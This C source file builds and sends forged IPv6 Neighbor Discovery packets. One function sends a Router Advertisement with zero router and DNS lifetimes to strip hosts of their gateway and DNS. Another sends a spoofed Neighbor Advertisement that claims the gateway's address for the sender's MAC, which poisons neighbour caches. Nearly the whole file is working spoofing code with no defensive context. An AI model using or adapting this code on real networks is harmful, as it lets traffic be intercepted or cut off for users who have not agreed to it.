#include "ndp_block.h"
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/icmp6.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

// Cached ifindex for NDP — resolved once, not per-packet
static int g_ndp_cached_ifindex = -1;

static int ensure_ndp_ifindex(int sockfd) {
  if (g_ndp_cached_ifindex == -1) {
    struct ifreq if_idx;
    memset(&if_idx, 0, sizeof(if_idx));
    strcpy(if_idx.ifr_name, "eth0");
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
      perror("SIOCGIFINDEX (NDP)");
      return -1;
    }
    g_ndp_cached_ifindex = if_idx.ifr_ifindex;
  }
  return g_ndp_cached_ifindex;
}

// ICMPv6 pseudo-header for checksum calculation
struct pseudo_header6 {
  struct in6_addr src;
  struct in6_addr dst;
  uint32_t len;
  uint8_t zero[3];
  uint8_t next_header;
} __attribute__((packed));

// Standard 16-bit checksum
unsigned short checksum(void *b, int len) {
  unsigned short *buf = b;
  unsigned int sum = 0;
  unsigned short result;

  for (sum = 0; len > 1; len -= 2)
    sum += *buf++;
  if (len == 1)
    sum += *(unsigned char *)buf;
  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);
  result = ~sum;
  return result;
}

int send_ndp_ra_block(int sockfd, unsigned char *src_mac,
                      unsigned char *src_ipv6) {
  int ifindex = ensure_ndp_ifindex(sockfd);
  if (ifindex < 0) return -1;

  struct sockaddr_ll socket_address;
  unsigned char dst_mac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
  struct in6_addr dst_ipv6;
  inet_pton(AF_INET6, "ff02::1", &dst_ipv6);

  memset(&socket_address, 0, sizeof(struct sockaddr_ll));
  socket_address.sll_ifindex = ifindex;
  socket_address.sll_halen = ETH_ALEN;
  memcpy(socket_address.sll_addr, dst_mac, 6);

  // Stack buffer — no malloc. Total ICMP payload: 16 (RA) + 8 (SLLA) + 24 (RDNSS) = 48 bytes
  int icmp_plen = sizeof(struct nd_router_advert) + 8 + 24;
  int packet_len = sizeof(struct ethhdr) + sizeof(struct ip6_hdr) + icmp_plen;
  unsigned char buffer[256]; // stack — fits easily
  memset(buffer, 0, packet_len);

  struct ethhdr *eth = (struct ethhdr *)buffer;
  memcpy(eth->h_source, src_mac, 6);
  memcpy(eth->h_dest, dst_mac, 6);
  eth->h_proto = htons(ETH_P_IPV6);

  struct ip6_hdr *ip6 = (struct ip6_hdr *)(buffer + sizeof(struct ethhdr));
  ip6->ip6_flow = htonl((6 << 28));
  ip6->ip6_plen = htons(icmp_plen);
  ip6->ip6_nxt = 58;
  ip6->ip6_hlim = 255;
  memcpy(&ip6->ip6_src, src_ipv6, 16);
  memcpy(&ip6->ip6_dst, &dst_ipv6, 16);

  struct nd_router_advert *ra =
      (struct nd_router_advert *)(buffer + sizeof(struct ethhdr) +
                                  sizeof(struct ip6_hdr));
  ra->nd_ra_type = 134;
  ra->nd_ra_code = 0;
  ra->nd_ra_curhoplimit = 64;
  ra->nd_ra_flags_reserved = 0x08;
  ra->nd_ra_router_lifetime = htons(0);
  ra->nd_ra_reachable = htonl(0);
  ra->nd_ra_retransmit = htonl(0);

  // Option 1: Source Link-Layer Address
  unsigned char *opt = (unsigned char *)(ra + 1);
  opt[0] = 1;
  opt[1] = 1;
  memcpy(opt + 2, src_mac, 6);

  // Option 2: RDNSS with 0 lifetime to clear DNS
  unsigned char *rdnss = opt + 8;
  rdnss[0] = 25;
  rdnss[1] = 3;
  uint32_t *rdnss_lifetime = (uint32_t *)(rdnss + 4);
  *rdnss_lifetime = htonl(0);
  inet_pton(AF_INET6, "::", rdnss + 8);

  // Checksum — stack pseudo buffer
  struct pseudo_header6 ps;
  memcpy(&ps.src, src_ipv6, 16);
  memcpy(&ps.dst, &dst_ipv6, 16);
  ps.len = htonl(icmp_plen);
  memset(ps.zero, 0, 3);
  ps.next_header = 58;

  int pseudo_len = sizeof(struct pseudo_header6) + icmp_plen;
  unsigned char pseudo_buf[256]; // stack
  memcpy(pseudo_buf, &ps, sizeof(struct pseudo_header6));
  memcpy(pseudo_buf + sizeof(struct pseudo_header6), ra, icmp_plen);
  ra->nd_ra_cksum = checksum(pseudo_buf, pseudo_len);

  if (sendto(sockfd, buffer, packet_len, 0, (struct sockaddr *)&socket_address,
             sizeof(struct sockaddr_ll)) < 0) {
    perror("sendto (NDP RA)");
    return -1;
  }

  return 0;
}

int send_ndp_na_spoof(int sockfd, unsigned char *dst_mac, unsigned char *src_mac,
                      unsigned char *gateway_ipv6) {
  int ifindex = ensure_ndp_ifindex(sockfd);
  if (ifindex < 0) return -1;

  struct sockaddr_ll socket_address;
  memset(&socket_address, 0, sizeof(struct sockaddr_ll));
  socket_address.sll_ifindex = ifindex;
  socket_address.sll_halen = ETH_ALEN;
  memcpy(socket_address.sll_addr, dst_mac, 6);

  int icmp_plen = sizeof(struct nd_neighbor_advert) + 8;
  int packet_len = sizeof(struct ethhdr) + sizeof(struct ip6_hdr) + icmp_plen;
  unsigned char buffer[256]; // stack — no malloc
  memset(buffer, 0, packet_len);

  struct ethhdr *eth = (struct ethhdr *)buffer;
  memcpy(eth->h_source, src_mac, 6);
  memcpy(eth->h_dest, dst_mac, 6);
  eth->h_proto = htons(ETH_P_IPV6);

  struct ip6_hdr *ip6 = (struct ip6_hdr *)(buffer + sizeof(struct ethhdr));
  ip6->ip6_flow = htonl((6 << 28));
  ip6->ip6_plen = htons(icmp_plen);
  ip6->ip6_nxt = 58;
  ip6->ip6_hlim = 255;
  memcpy(&ip6->ip6_src, gateway_ipv6, 16);
  if (dst_mac[0] == 0x33) {
      inet_pton(AF_INET6, "ff02::1", &ip6->ip6_dst);
  } else {
      inet_pton(AF_INET6, "ff02::1", &ip6->ip6_dst);
  }

  struct nd_neighbor_advert *na =
      (struct nd_neighbor_advert *)(buffer + sizeof(struct ethhdr) +
                                    sizeof(struct ip6_hdr));
  na->nd_na_type = 136;
  na->nd_na_code = 0;
  na->nd_na_flags_reserved = 0xA0;
  memcpy(&na->nd_na_target, gateway_ipv6, 16);

  // Option: Target Link-Layer Address
  unsigned char *opt = (unsigned char *)(na + 1);
  opt[0] = 2;
  opt[1] = 1;
  memcpy(opt + 2, src_mac, 6);

  // Checksum — stack pseudo buffer
  struct pseudo_header6 ps;
  memcpy(&ps.src, &ip6->ip6_src, 16);
  memcpy(&ps.dst, &ip6->ip6_dst, 16);
  ps.len = htonl(icmp_plen);
  memset(ps.zero, 0, 3);
  ps.next_header = 58;

  int pseudo_len = sizeof(struct pseudo_header6) + icmp_plen;
  unsigned char pseudo_buf[256]; // stack
  memcpy(pseudo_buf, &ps, sizeof(struct pseudo_header6));
  memcpy(pseudo_buf + sizeof(struct pseudo_header6), na, icmp_plen);
  na->nd_na_cksum = checksum(pseudo_buf, pseudo_len);

  if (sendto(sockfd, buffer, packet_len, 0, (struct sockaddr *)&socket_address,
             sizeof(struct sockaddr_ll)) < 0) {
    perror("sendto (NDP NA)");
    return -1;
  }

  return 0;
}
